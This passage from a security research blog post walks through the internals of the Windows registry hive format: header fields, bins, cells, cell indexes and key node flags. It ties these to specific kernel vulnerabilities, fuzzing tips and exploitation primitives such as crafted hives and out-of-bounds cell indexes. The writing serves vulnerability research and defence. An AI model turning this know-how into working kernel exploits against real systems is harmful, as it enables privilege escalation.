   +0x014 Major            : Uint4B

   +0x018 Minor            : Uint4B

   +0x01c Type             : Uint4B

   +0x020 Format           : Uint4B

   +0x024 RootCell         : Uint4B

   +0x028 Length           : Uint4B

   +0x02c Cluster          : Uint4B

   +0x030 FileName         : [64] UChar

   +0x070 RmId             : \_GUID

   +0x080 LogId            : \_GUID

   +0x090 Flags            : Uint4B

   +0x094 TmId             : \_GUID

   +0x0a4 GuidSignature    : Uint4B

   +0x0a8 LastReorganizeTime : Uint8B

   +0x0b0 Reserved1        : [83] Uint4B

   +0x1fc CheckSum         : Uint4B

   +0x200 Reserved2        : [882] Uint4B

   +0xfc8 ThawTmId         : \_GUID

   +0xfd8 ThawRmId         : \_GUID

   +0xfe8 ThawLogId        : \_GUID

   +0xff8 BootType         : Uint4B

   +0xffc BootRecover      : Uint4B

The first thing that stands out is the fact that even though the base block is 4096-bytes long, it only really stores around 236 bytes of meaningful data, and the rest (the Reserved1 and Reserved2 arrays) are filled with zeros. For a detailed description of each field, I encourage you to refer to the two unofficial regf specifications mentioned earlier. In the sections below, I share additional thoughts on the usage and relevance of some of the most interesting header members.

#### Sequence1, Sequence2

These 32-bit numbers are updated by the kernel during registry write operations to keep track of the consistency state of the hive. If the two values are equal during loading, the hive is in a "clean" state and doesn't require any kind of recovery. If they differ, this indicates that not all pending changes have been fully committed to the primary hive file, and additional modifications must be applied based on the accompanying .LOG/.LOG1/.LOG2 files. From a security point of view, manually controlling these fields may be useful in ensuring that the log recovery logic (HvAnalyzeLogFiles, HvpPerformLogFileRecovery and related functions) gets executed by the kernel. This is what I did when crafting the proof-of-concept files for [CVE-2023-35386](https://project-zero.issues.chromium.org/issues/42451598) and [CVE-2023-38154](https://project-zero.issues.chromium.org/issues/42451600).

#### Major, Minor

These are some of the most consequential fields in the header: they represent the major and minor version of the hive. The only valid major version is 1, while the minor version has been historically an integer between 0 and 6. Here is an overview of the different 1.x versions in existence:

| Version | Year | Introduced in | New features |
| --- | --- | --- | --- |
| 1.0 | 1992 | Windows NT 3.1 Pre-Release | Initial format |
| 1.1 | 1993 | Windows NT 3.1 |  |
| 1.2 | 1994 | Windows NT 3.5 | Predefined keys |
| 1.3 | 1995 | Windows NT 4.0 | Fast leaves |
| 1.4 | 2000 | Windows Whistler Beta 1 | Big value support |
| 1.5 | 2001 | Windows XP | Hash leaves |
| 1.6 | 2016 | Windows 10 Anniversary Update | Layered keys |

The later versions draw extensively on the earlier ones both conceptually and in terms of the actual implementation – there are non-trivial portions of code in Windows NT 3.1 Beta that are used to this day in the latest Windows 11. But when it comes to pure binary compatibility, versions 1.0 to 1.2 differ too much from the newer ones and have long been considered obsolete. This leaves us with versions ≥ 1.3, which are all cross-compatible and can be used freely on the current systems. Within this group, version 1.4 was an intermediate step in the development of the format, observed only in beta releases of Windows XP (codenamed Whistler). The other three are all in active use, and can be found in a default installation of Windows 10 and 11:

* 1.3: encodes volatile hives (the root hive, HKLM\HARDWARE), the BCD hive (HKLM\BCD00000000), the user classes hives (HKU\<SID>\_Classes), and some application hives (backed by settings.dat).
* 1.5: encodes a majority of the system hives in HKLM (SYSTEM, SOFTWARE, SECURITY, SAM, DRIVERS), all user hives (HKU\<SID>), and most application hives (backed by ActivationStore.dat).
* 1.6: encodes all differencing hives, i.e. hives used by processes running inside Application and Server Silos, mounted under \Registry\WC.

It is worth noting that the hive version is supposed to be indicative of the features used inside; for example, only hives with versions ≥1.4 should use big values (values longer than 1 MiB), only hives with versions ≥1.5 should use hash leaves, etc. However, this is not actually enforced when loading a hive, and newer features being used in older hives will work completely fine. This behavior may become a problem if any part of the registry code makes any assumptions about the structure of the hive based solely on its version. One example of such a vulnerability was [CVE-2022-38037](https://project-zero.issues.chromium.org/issues/42451465), caused by the fact that the CmpSplitLeaf kernel function determined the format of a subkey list based on the hive version and not the binary representation of the list itself. In general, when writing a registry-specific fuzzer, it might be a good idea to flip the minor version between 3-6 to increase the chances of hitting some interesting corner cases related to version handling.

As a last note, the version number is internally converted to a single 32-bit integer stored in the \_HHIVE.Version structure member using the following formula: Minor+(Major\*0x1000)-0x1000. In the typical case where the major version is 1, the last two components cancel each other out, e.g. version 1.5 becomes simply "5". This would be fine, if not for the fact that a major version of 0 is also allowed by HvpGetHiveHeader, in which case the minor version can be any value greater or equal to 3. Furthermore, if the kernel enters the header recovery path (because the hive header is corrupted and needs to be recovered from a .LOG file), then one can set the major/minor fields to completely arbitrary values and they will be accepted, as HvAnalyzeLogFiles doesn't perform the same strict checks that HvpGetHiveHeader does. Consequently, it becomes possible to spoof the version saved in \_HHIVE.Version and have it take virtually any value in the 32-bit range, but I haven't found any security implications of this behavior, and I'm sharing it simply as a curiosity.

#### RootCell

This is the cell index (offset in the hive file) of the root key, which marks a starting point for the Configuration Manager to parse the hive tree. The root cell is special in many respects: it is the only one in a hive that doesn't have a parent, it cannot be deleted or renamed, its name is unused (it is instead referenced by the name of its mount point), and its security descriptor is treated as the head of the security descriptor linked list. While the RootCell member itself has not been directly involved in any bugs I am aware of, it is worth keeping its special properties in mind when doing registry security research.

#### Length

Specifies the cumulative size of all bins in the hive, i.e. its file size minus 4096 (the size of the header). It is limited to 0x7FFFE000, which reflects the ~2 GiB capacity of the hive stable storage (the part of the hive that resides on disk). Combined with another ~2 GiB of volatile space (in-memory hive data that gets erased on reboot), we get a total maximum size of around 4 GiB when both types of storage space are completely maxed out. Incidentally, that's the same range as a single 32-bit cell index can address.

#### Flags

There are currently only two supported hive flags: 0x1, which indicates whether there are any pending transactions involving the hive, and 0x2, which expresses whether the hive is differencing and contains layered keys or not. The latter flag is typically set when the hive version is 1.6.

#### LastReorganizeTime

In order to address the problem of accumulating fragmentation over time, Windows 8.1 introduced a new mechanism to both shrink and optimize hives during load called reorganization. It happens automatically if the last reorganization took place more than seven days ago and the fragmentation rate of the hive is greater than 1 MiB. Reorganization achieves its goals by starting off with an empty hive and copying all existing keys recursively, taking into account which ones have been used during boot, during system runtime, and not at all since the last reorganization. The end result is that the hive becomes more packed, thanks to the elimination of free cells taking up unnecessary space, and more efficient to operate on, because the "hot" keys are grouped closer together.

As the name suggests, the LastReorganizeTime member stores the timestamp of the last time a successful reorganization took place. From an attacker's perspective, it can be adjusted to control the behavior of the internal CmpReorganizeHive function and deterministically trigger the reorganization or skip it, depending on the desired end result. In addition to indicating a timestamp, the LastReorganizeTime field may also be equal to one of two special marker values: 0x1 to have the hive unconditionally reorganized on the next load, and 0x2 to clear the access bits on all the keys in the hive, i.e. reset the key usage information that has been collected so far.

#### CheckSum

The CheckSum field at offset 0x1FC stores the checksum of the first 508 bytes of the header (i.e. all data prior to this field), and is simply a 32-bit XOR of the header data treated as a series of 127 consecutive DWORDs. If the computed value is equal to 0xFFFFFFFF (-1), then the checksum is set to 0xFFFFFFFE (-2), and if the computed value is 0x0, then the checksum is 0x1. This means that 0 (all bits clear) and -1 (all bits set) are never valid checksum values. If you wish to examine the kernel implementation of the algorithm, you can find it in the internal HvpHeaderCheckSum function.

The checksum is particularly important when making changes to existing hives, either for experimentation or during fuzzing. If any data within the first 508 bytes of the file is modified, the checksum needs to be adjusted accordingly. Otherwise, the system will reject the file early in the loading process with the STATUS\_REGISTRY\_CORRUPT error code, and none of the deeper code paths will be exercised. Therefore, fixing up the checksum is the bare minimum a hive fuzzer should do to maximize its chances of success.

#### Other fields

There are several other pieces of information in the header that carry some value, more so in the context of digital forensics and incident response than strictly low-level system security. For example, "Signature" identifies the file as a regf hive and may make it easier to identify the format in raw memory/disk dumps, while "TimeStamp" indicates the last time the hive has been written to, which can be critical for establishing a timeline of events during an investigation. Furthermore, the [Offline Registry Library](https://learn.microsoft.com/en-us/windows/win32/devnotes/offline-registry-library-portal) (offreg.dll) leaves further traces in the generated hive files: a 4-byte "OfRg" identifier at offset 0xB0 (nominally the Reserved1 field) and a serialization timestamp at offset 0x200 (nominally Reserved2). For more information about the meaning and usefulness of each part of the header, please refer to one of the unofficial format specifications.

### Bins

Bins in registry hives are a simple organizational concept used to split a potentially large hive into smaller chunks that can be mapped in memory independently of each other. Each of them starts with a 32-byte \_HBIN structure:

0: kd> dt \_HBIN

nt!\_HBIN

   +0x000 Signature        : Uint4B

   +0x004 FileOffset       : Uint4B

   +0x008 Size             : Uint4B

   +0x00c Reserved1        : [2] Uint4B

   +0x014 TimeStamp        : \_LARGE\_INTEGER

   +0x01c Spare            : Uint4B

The four meaningful fields here are the four-byte signature ("hbin"), offset of the bin in the file, size of the bin, and a timestamp. Among them, the signature is a constant, the file size is sanitized early in the hive process and effectively also a constant, and the timestamp is not security-relevant. This leaves us with the size as the most interesting part of the header. The only constraints for it is that it must be a multiple of 0x1000, and the sum of the offset and size must not exceed the total length of the hive (\_HBASE\_BLOCK.Length). At runtime, bins are allocated as the smallest 4 KiB-aligned regions that fit a cell of the requested size, so in practice, they typically end up being between 4-16 KiB in size, but they may organically be as long as 1 MiB. While longer bins cannot be produced by the Windows kernel, there is nothing preventing a specially crafted hive from being loaded in the system with a bin of ~2 GiB in size, the maximum length of a hive as a whole. This behavior doesn't seem to have any direct security implications, but more generally, it is a great example of how the hive states written by Windows are a strictly smaller subset of the set of states accepted as valid during loading:

[![Image showing that the states written by the kernel are a subset of states accepted by the hive loader](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgYqh3EsSpb1OQE4B1Z9wJu72kGwf9ucWfyBv7Ydmo3lvQcR9-IGjcLYjeCl4AcC_8Ng9gsCCXKs6gtDparNcaqGlDfuZqkS5OEpkAWqhCwwPpTTLcCi5oi-BsBnzHGAzh_Q4pkzjCrauCEHvz9y1f-6KVaFdVZyp_D58CZIVy8ZL13Uv5LRj7Jytc_qao/s720/image14.png "Image showing that the states written by the kernel are a subset of states accepted by the hive loader")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgYqh3EsSpb1OQE4B1Z9wJu72kGwf9ucWfyBv7Ydmo3lvQcR9-IGjcLYjeCl4AcC_8Ng9gsCCXKs6gtDparNcaqGlDfuZqkS5OEpkAWqhCwwPpTTLcCi5oi-BsBnzHGAzh_Q4pkzjCrauCEHvz9y1f-6KVaFdVZyp_D58CZIVy8ZL13Uv5LRj7Jytc_qao/s720/image14.png)

### Cells

Cells are the smallest unit of data in registry hives – they're continuous buffers of arbitrary lengths. They do not have a dedicated header structure like \_HBASE\_BLOCK or \_HBIN, but instead, each cell simply consists of a signed 32-bit size marker followed by the cell's data. The size field is subject to the following constraints:

* A cell may be in one of two states – allocated and free – as indicated by the sign of the size value. Positive values are used for free cells, and negative ones for allocated cells.
* The size value accounts for the four bytes occupied by itself.
* The size value must be a multiple of 8 (i.e. have its three lowest bits set to zero). If a cell with size non-divisible by 8 is allocated at runtime, it is aligned up to the next multiple of 8, potentially leading to some unused padding bytes at the end of the cell.
* The sum of all consecutive cells in a bin must be equal to the length of the bin. In other words, the bin header followed by tightly packed cells (with no gaps) completely fill the bin space. If the hive loader detects that this is not the case, it forcefully fixes it by creating a single free cell spanning from the failing point up to the end of the bin. This invariant must subsequently hold for the entire time the hive is loaded in the system.

If cells remind you of heap allocations requested via malloc or HeapAlloc, it is not just your impression. There are many parallels to be drawn between hive cells and heap buffers: both can be allocated and freed, have arbitrary sizes and store a mixture of well-formatted structures and free-form user data. However, there are some significant differences too: heap implementations have evolved to include anti-exploitation mitigations like layout randomization, heap cookies for metadata protection, double-free detection and miscellaneous other consistency checks. On the other hand, hives have none of that: the allocation logic is fully deterministic and doesn't involve any randomness, there is no metadata protection, and generally little to no runtime checks. This is likely caused by the fact that heap chunks have been targets of memory corruption for many decades, whereas the registry was designed with the assumption that once loaded, the hive structure is always internally consistent and intra-hive memory corruption may never occur. This makes the exploitation of certain registry bugs particularly convenient and reliable, as I will demonstrate in future blog posts.

Like a typical memory allocator interface, cells have alloc, realloc, and free functions. Specifically, the internal routines responsible for these tasks in the Windows kernel are HvAllocateCell, HvReallocateCell and HvFreeCell, and reverse-engineering them allowed me to uncover some helpful insights. For instance, I have found that HvAllocateCell and HvReallocateCell reject allocation sizes larger than 1 MiB, and for requests above 16 KiB, they round the size up to the next power of two. Meanwhile, HvFreeCell performs coalescing of free cells, so there should never be two adjacent free cells in an organically created hive. These are some further examples of behavior that is guaranteed on output, but not enforced on input. This is a prevalent pattern in the Windows registry, and I found it useful to keep track of such primitives in my research, even if they didn't seem particularly useful at the time. Thanks to this, I have discovered at least three security bugs closely related to this phenomenon, including one in the interactions between HvReallocateCell and its callers ([CVE-2022-37988](https://project-zero.issues.chromium.org/issues/42451463)).

### Cell indexes

If we equate cells to heap buffers in user-mode applications, then cell indexes would be pointers. Cells rely on these indexes to interrelate within the registry's complex structure. For example, keys reference security descriptors (to control access), their parent key (to navigate the hierarchy), and optionally the list of subkeys and list of values (to organize data). The list of values references specific value records, which in turn reference the actual data backing cells, and so on. This intricate web of relationships is no different from any semi-complex object in a C/C++ program, where pointers link various data structures.

On disk, cell indexes are nothing special: they are simply 32-bit offsets from the start of the hive data (after the 0x1000 byte header), which is a typical way of implementing cross-object references in most file formats. However, it's important to note that a cell index must point to the beginning of a cell (not inside it or in the bin header), and the cell must be in the allocated state – otherwise, the index is considered invalid. So when implementing a read-only regf parser operating on the hive as a contiguous memory block, translating cell indexes is as simple as adding them to the starting address of the hive in memory.

When a hive is loaded in Windows, the management of cell indexes becomes more complex. Hives at rest have a maximum size of 2 GiB, and all of their data is considered stable (persistently stored). On the other hand, an active hive also gains an additional 2 GiB of volatile storage, used for temporary keys and values that reside only in memory. These temporary entries exist only while the hive is loaded (or until the system is shut down) and can be created by calling [RegCreateKeyEx](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexw) with the [REG\_OPTION\_VOLATILE](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexw%23reg_option_volatile) flag, which designates the key as temporary. To distinguish between these two storage spaces in a cell index, the highest bit serves as an indicator: 0x0 for stable space and 0x1 for the volatile one, resulting in large index values (greater than 0x80000000) that readily identify volatile cells.

But an even bigger complication stems from the fact that hives can shrink and grow at runtime, so it is largely impractical to have them mapped as a single block of memory. To efficiently handle modifications to the registry, Windows maps hives in smaller chunks, which makes the previous method of translating cell indexes obsolete, and necessitates a more sophisticated solution. The answer to the problem are cell maps – pagetable-like structures that divide the 32-bit hive address space into smaller, nested layers, indexed by the respective 1, 10, 9, and 12-bit parts of the 32-bit cell index. Cell maps in the Windows kernel utilize a hierarchical structure consisting of storage arrays, directories, tables, and leaf entries, all defined within the ntoskrnl.exe PDB symbols (the relevant structures are \_DUAL, \_HMAP\_DIRECTORY, \_HMAP\_TABLE and \_HMAP\_ENTRY). The layout of cell indexes and cell maps is illustrated in the diagram below, based on a similar diagram in the Windows Internals book, which itself draws from Mark Russinovich's 1999 article, [Inside the Registry](https://learn.microsoft.com/en-us/previous-versions//cc750583%28v%3Dtechnet.10%29):

[![Cell Index Image](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgCnLfjamN3weVknLoBRSdhrrgxg4incqp0IIvqzjmymKwz39z3wptwKxQYyEpW8Lj15493Nx9sdrcZype51AqDczO8_RJWZEgHNRKoWSA7CXuN70U8_SHvieNxsPbuf6k2L_z10A17wPTxcqr7TqLfAzHfmtKNgEuTRkeiJT_2NPuw5DD6DVWvw_TbSNg/s1200/image11.png "Cell Index Image")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgCnLfjamN3weVknLoBRSdhrrgxg4incqp0IIvqzjmymKwz39z3wptwKxQYyEpW8Lj15493Nx9sdrcZype51AqDczO8_RJWZEgHNRKoWSA7CXuN70U8_SHvieNxsPbuf6k2L_z10A17wPTxcqr7TqLfAzHfmtKNgEuTRkeiJT_2NPuw5DD6DVWvw_TbSNg/s1999/image11.png)

Cell indexes play a central role in core registry operations, such as creating, reading, updating, and deleting keys and values. The internal kernel function responsible for traversing the cell map and translating cell indexes into virtual addresses is HvpGetCellPaged. In normal conditions, the indexes stay within the bounds of the storage space size (\_HHIVE.Storage[x].Length), so HvpGetCellPaged assumes their validity and doesn't perform any additional bounds checking. However, certain memory corruption vulnerabilities may allow attackers to manipulate these cell indexes at runtime. Crucially, I discovered that out-of-bounds cell indexes can serve as a powerful primitive for exploit development, enabling the construction of proof-of-concept exploits that achieve local elevation of privileges. I will elaborate further on this in future exploit-focused blog posts.

As a last note, the special marker of -1 (0xFFFFFFFF) is used to represent non-existent cells, and can be found in cell indexes pointing at optional data that doesn't exist – basically a hive equivalent of a NULL pointer. The internal name for the constant in the Windows kernel is HCELL\_NIL, and under normal circumstances, it should never be passed directly to HvpGetCellPaged. Doing so without guaranteeing that the cell index is valid first would constitute a bug in the Windows kernel (for example, see [CVE-2023-35357](https://project-zero.issues.chromium.org/issues/42451589) or [CVE-2023-35358](https://project-zero.issues.chromium.org/issues/42451590)).

## Cell types

Now that we have familiarized ourselves with the low-level structure of hives that facilitates their efficient management in memory, let's go a little further and learn about the types of information stored in the cells. These are the objects that actually define the registry tree and all of its properties: keys, values, security descriptors, etc. The first subsection provides a general overview of the various cell types found within a hive and the relations between them. The second one goes into the intricate details of their format and usage within the Windows kernel, uncovering obscure implementation details rarely documented elsewhere.

### Overview of cell types

Registry hives utilize only seven distinct cell types to represent the various data structures within the registry, as outlined below:

1. Key Node: Represents a single registry key and its associated metadata. It is defined by the \_CM\_KEY\_NODE structure and contains references to other cells, including its parent key, security descriptor, class data (optional), and lists of subkeys (stable and volatile) and values (optional).
2. Subkey Index: A variable-length list of key node cell indexes, representing the subkeys of a specific key. For performance reasons, there are four variations of subkey indexes: index leaf, fast leaf, hash leaf, and root index. All are represented by the \_CM\_KEY\_INDEX structure.
3. Security Descriptor: Defines access control information for one or more keys, specifically a security descriptor in a self-relative format. Represented by the \_CM\_KEY\_SECURITY structure, it is the only cell type that can be referenced from multiple key nodes and is therefore reference-counted. It also contains links to the next and previous security descriptors in the hive.
4. Key Value: Defines a single value associated with a key, including its name, type, data length, and a reference to the cell containing the actual data. It is represented by the \_CM\_KEY\_VALUE structure.
5. Big Data: Used to store value data exceeding 16,344 bytes (~16 KiB) in hive versions 1.4 and later. The data is divided into chunks of up to 16 KiB each, allowing for values approaching 1 GiB. The \_CM\_BIG\_DATA structure represents this cell type, containing the number of chunks and a reference to the list of chunk cells.
6. Value List and Chunk List Cells: These cells are simple arrays of 32-bit cell indexes. They are used to store lists of values associated with a key and lists of chunks for large value data.
7. Data Cells: These cells store the raw data associated with keys and values. They hold the optional class data for a key, the complete data for small values (up to 1 MiB in older hives, ~16 KiB in newer hives), and the individual chunks of large values.

The diagram below illustrates the relationships between these cell types:

[![Diagram illustrating the relationships between these cell types](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9sBOCJ5Wjme99GVbzbKzraCQRVqsJmcNVPeiPTJcQ4N_PipfueQfUEsb3Sfswy0BnxXQuM9iWvq4cjc0A28rJR_Jv5XJ9g99Yszsd8zATyoszpsfWwFCV127-5eNmYAO3V5Atj_pMul6xIMwk6Cm_t6dka6Uyq3xNmCkNa4ok7laVo8kdNXUEE4w_rJc/s1200/image6.png "Diagram illustrating the relationships between these cell types")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9sBOCJ5Wjme99GVbzbKzraCQRVqsJmcNVPeiPTJcQ4N_PipfueQfUEsb3Sfswy0BnxXQuM9iWvq4cjc0A28rJR_Jv5XJ9g99Yszsd8zATyoszpsfWwFCV127-5eNmYAO3V5Atj_pMul6xIMwk6Cm_t6dka6Uyq3xNmCkNa4ok7laVo8kdNXUEE4w_rJc/s1999/image6.png)

### Deep dive into each cell type

Now that we know the general purpose of each cell type, it's a good time to dig a little deeper into each of them. This lets us explore both their implementation details, as well as the spirit behind these objects and how they interact with each other in a real-life environment. I have tried my best to avoid repeating the existing unofficial specifications and instead only focus on the security-relevant and sparsely documented aspects of the format, but if any redundant information makes it into this section, please bear with me. 🙂

#### Key nodes

As keys are the most important part of the registry, key nodes are the most important and complex of all cell types. When dumped in WinDbg, the layout of the \_CM\_KEY\_NODE structure is as follows:

0: kd> dt \_CM\_KEY\_NODE /r

nt!\_CM\_KEY\_NODE

   +0x000 Signature        : Uint2B

   +0x002 Flags            : Uint2B

   +0x004 LastWriteTime    : \_LARGE\_INTEGER

   +0x00c AccessBits       : UChar

   +0x00d LayerSemantics   : Pos 0, 2 Bits

   +0x00d Spare1           : Pos 2, 5 Bits

   +0x00d InheritClass     : Pos 7, 1 Bit

   +0x00e Spare2           : Uint2B

   +0x010 Parent           : Uint4B

   +0x014 SubKeyCounts     : [2] Uint4B

   +0x01c SubKeyLists      : [2] Uint4B

   +0x024 ValueList        : \_CHILD\_LIST

      +0x000 Count            : Uint4B

      +0x004 List             : Uint4B

   +0x01c ChildHiveReference : \_CM\_KEY\_REFERENCE

      +0x000 KeyCell          : Uint4B

      +0x008 KeyHive          : Ptr64 \_HHIVE

   +0x02c Security         : Uint4B

   +0x030 Class            : Uint4B

   +0x034 MaxNameLen       : Pos 0, 16 Bits

   +0x034 UserFlags        : Pos 16, 4 Bits

   +0x034 VirtControlFlags : Pos 20, 4 Bits

   +0x034 Debug            : Pos 24, 8 Bits

   +0x038 MaxClassLen      : Uint4B

   +0x03c MaxValueNameLen  : Uint4B

   +0x040 MaxValueDataLen  : Uint4B

   +0x044 WorkVar          : Uint4B

   +0x048 NameLength       : Uint2B

   +0x04a ClassLength      : Uint2B

   +0x04c Name             : [1] Wchar

In the following subsections, each member is discussed in more detail.

##### Signature

This field always stores the special value 0x6B6E, which translates to 'nk' when written in little-endian. It exists for informational purposes only, and isn't used for anything meaningful in the code after the initial sanitization during load.

##### Flags

This is a highly interesting and security-relevant field, as it indicates the role of the key in the hive, and clarifies how certain parts of the key node are formatted. The present and historical flags are presented in the table below together with their names and descriptions:

| Mask | Name | Description |
| --- | --- | --- |
| 0x0001 | KEY\_VOLATILE | (Deprecated) The flag used to indicate that the key and all its subkeys were volatile, but it is obsolete now and hasn't been used in several decades. Information about the key stable/volatile state can be inferred from the highest bit of the key's cell index. |
| 0x0002 | KEY\_HIVE\_EXIT | Indicates that the key is the mount point of another registry hive. These special mount points are used to facilitate attaching new registry hives to the global registry view starting at \Registry in a live system. Exit nodes only ever exist in memory, so hives on disk mustn't have the flag set. More on the subject of mount points and exit nodes can be found in the next section, "Link nodes". |
| 0x0004 | KEY\_HIVE\_ENTRY | Indicates that the given key is the entry to a hive, or in other words, the root of a hive. The flag must be set on the root key of each hive, and mustn't be set on any other nested keys. A hive entry key cannot be a symbolic link (KEY\_SYM\_LINK mustn't be set). |
| 0x0008 | KEY\_NO\_DELETE | Indicates that the key cannot be deleted: any attempt to do so will return the error code STATUS\_CANNOT\_DELETE. This flag is always set on hive exit and hive entry keys, but is not allowed for any other keys. |
| 0x0010 | KEY\_SYM\_LINK | Indicates that the key is a symbolic link, which has been created by specifying the REG\_OPTION\_CREATE\_LINK flag in the [RegCreateKeyEx](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexw) call. They are freely accessible and don't come with many restrictions: every key other than a hive exit/entry key can be a symbolic link. However, they are required to adhere to additional structural requirements: they may only contain up to one value, and that value must be of type REG\_LINK (6), named "SymbolicLinkValue", and a maximum of 65534 bytes long (32767 wide characters). |
| 0x0020 | KEY\_COMP\_NAME | Indicates that the name of the key consists of ASCII characters only, and thus it has been "compressed" to fit two 8-bit characters in each of the 16-bit wide characters of \_CM\_KEY\_NODE.Name. This optimization aims to save storage space and memory, especially as a great majority of keys have simple, alphanumeric names. This flag can be set on virtually every key in the registry, and indeed, it is by far the most commonly used one. |
| 0x0040 | KEY\_PREDEF\_HANDLE | (Deprecated) The flag used to indicate that the key was a "predefined-handle key", which was a special kind of a symbolic link. The name refers to [Predefined Keys](https://learn.microsoft.com/en-us/windows/win32/sysinfo/predefined-keys), a set of top-level keys such as HKLM or HKCU recognized by the Win32 API. Keys with the KEY\_PREDEF\_HANDLE flag set allowed the system to redirect certain keys to chosen 32-bit HKEY pseudo-handles, and were specifically introduced in Windows NT 3.5 in 1994 for the purpose of redirecting two system keys related to [reading performance data through the registry](https://learn.microsoft.com/en-us/windows/win32/perfctrs/using-the-registry-functions-to-consume-counter-data):   * HKLM\Software\Microsoft\Windows NT\CurrentVersion\Perflib\009 → HKEY\_PERFORMANCE\_TEXT * HKLM\Software\Microsoft\Windows NT\CurrentVersion\Perflib\CurrentLanguage → HKEY\_PERFORMANCE\_NLSTEXT   Contrary to regular symbolic links, predefined keys re-purposed parts of the key node structure (specifically the value list length) to store the link destination, instead of using higher-level features of the format (such as the "SymbolicLinkValue" which is otherwise a perfectly normal value associated with a key). Such a change in semantics required a significant amount of special handling of predefined keys, which were not supposed to be operated on other than being opened. This, in turn, led to a number of security vulnerabilities related to the feature. For a detailed case study of one of them, CVE-2023-35633, see my [Windows Registry Deja Vu: The Return of Confused Deputies](https://j00ru.vexillium.org/talks/confidence-windows-registry-deja-vu-the-return-of-confused-deputies/) talk from CONFidence 2024.  As recently as 2023, all keys other than hive roots could be predefined keys, provided that they had been manually crafted in a binary controlled hive, because there was otherwise no supported way to create them via API. As a consequence of my reports, the feature was deprecated completely in July 2023 for Windows 10 1607+ and 11, and in December 2023 for older systems. At the time of this writing, the only two predefined keys left in existence are the original "009" and "CurrentLanguage" ones, and all other such keys are transparently converted to normal keys during hive load. |

Furthermore, there are also three flags related to [Registry Virtualization](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-virtualization), which was introduced in Windows Vista and is supported up to and including Windows 11:

| Mask | Name | Description |
| --- | --- | --- |
| 0x0080 | VirtualSource | Indicates that the key has been subject to virtualization, i.e. that it has a counterpart in the virtual store subtree. It is typically set on keys inside HKLM\Software which have been attempted to be opened with write access by a program running as a non-administrator. |
| 0x0100 | VirtualTarget | Indicates that the key is a virtual replica of a key in a global system hive that has been subject to virtualization. It is typically set on keys inside HKU\<SID>\_Classes\VirtualStore that have been created as a result of virtualization. It can only be set if VirtualStore (0x200) is set on the key, too. |
| 0x0200 | VirtualStore | Indicates that the key is part of the virtual store registry subtree, typically HKU\<SID>\_Classes\VirtualStore and its subkeys. It means that new virtualization targets may be created inside the key, but it itself isn't necessarily a virtual key (unless the VirtualTarget flag is also set). |

As we can see, the purpose of these flags is to keep track of the virtualization state of each key. Given that they express the internal state of the key and are intended to be modified by the kernel only, there doesn't seem to be a good reason to allow user-mode clients to modify the flags on demand. But in practice, unprivileged users have a lot of control over them: programs may arbitrarily set them in hives loaded from disk that they control (app hives and the user hive), and they may also set and clear them at runtime with the NtSetInformationKey(KeySetVirtualizationInformation) system call, as long as they are granted KEY\_SET\_VALUE access to the key. This makes it effectively possible to "spoof" virtual source/target/store keys, and opens up all of the registry virtualization code for potential abuse by unprivileged users. This has led to the discovery of multiple bugs directly related to virtualization: [CVE-2015-0073](https://project-zero.issues.chromium.org/issues/42451263) and [CVE-2019-0881](https://project-zero.issues.chromium.org/issues/42450862) by James Forshaw, and [several more](https://project-zero.issues.chromium.org/issues?q%3Did:(42451475%2520%257C%252042451502%2520%257C%252042451512%2520%257C%252042451515%2520%257C%252042451516%2520%257C%252042451527%2520%257C%252042451589%2520%257C%252042451627)) as part of my recent research.

##### LastWriteTime

This is yet another timestamp, in this case tracked on a key-granularity level. I assume it may be an interesting artifact for purposes of digital forensics, but otherwise it doesn't seem particularly security-relevant. One thing of note is that this information is very easy to query at runtime, as it is returned by the [RegQueryInfoKey](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryinfokeyw) API, and is also a part of the output structures of numerous [key information classes](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ne-wdm-_key_information_class) that can be queried via the NtQueryKey system call.

##### AccessBits

While theoretically an 8-bit field, this is effectively a 2-bit bitmask introduced in Windows 8 as part of the hive reorganization logic described earlier. It tracks the system phase(s) in which the key has been accessed: 0x0 if not accessed at all, 0x1 if accessed during boot, and 0x2 if accessed during normal system operation. This information is then used during reorganization to allocate key nodes with similar access bits close together.

##### LayerSemantics

This member is a 2-bit enum, used exclusively in hive version 1.6, which corresponds to differencing hives (also known as delta hives). Differencing hives are closely related to containerization support, and their purpose is to be overlaid on another hive in the system rather than being mounted as a standalone hive. For this reason, every key in a differencing hive is in one of four states, which indicate how the key should be interpreted in relation to the keys below it (i.e. the corresponding keys in lower-layer hives).

These four states are:

* Merge-Backed (0): the properties of the key are meant to be merged with the properties of the underlying keys in the key stack.
* Tombstone (1): the key is deleted at the current level, so none of the keys below it should be considered.
* Supersede-Local (2): the properties of the key fully supersede any state in the key stack below it: only values associated with that level (and any upper layers) are visible to the user.
* Supersede-Tree (3): same as Supersede-Local, but it applies to the key itself and recursively to all of its subkeys.

There is also an additional, implicit state called Merge-Unbacked, used to describe keys that don't exist in a hive at a given level, and so they simply fall through to the state represented by keys in the lower layers. Overall, layer semantics play a crucial role in the functionality of layered keys and differencing hives, and their correct handling in the registry implementation is paramount to system security and stability. Unfortunately, the feature is too complex to thoroughly discuss here, but there are some excellent resources on the subject: Microsoft's [Containerized Configuration](https://patents.google.com/patent/US20170279678A1/en) (US20170279678A1) patent, Maxim Suhanov's [Containerized registry hives in Windows](https://dfir.ru/2020/08/15/containerized-registry-hives-in-windows/) blog post, and the "Registry virtualization" section in Chapter 10 of the Windows Internals 7 (Part 2) book.

##### InheritClass

This bit is also related to layered keys, and it indicates whether the key inherits the class value from its counterparts lower in the key stack, or defines its own (or lack thereof).

##### Parent

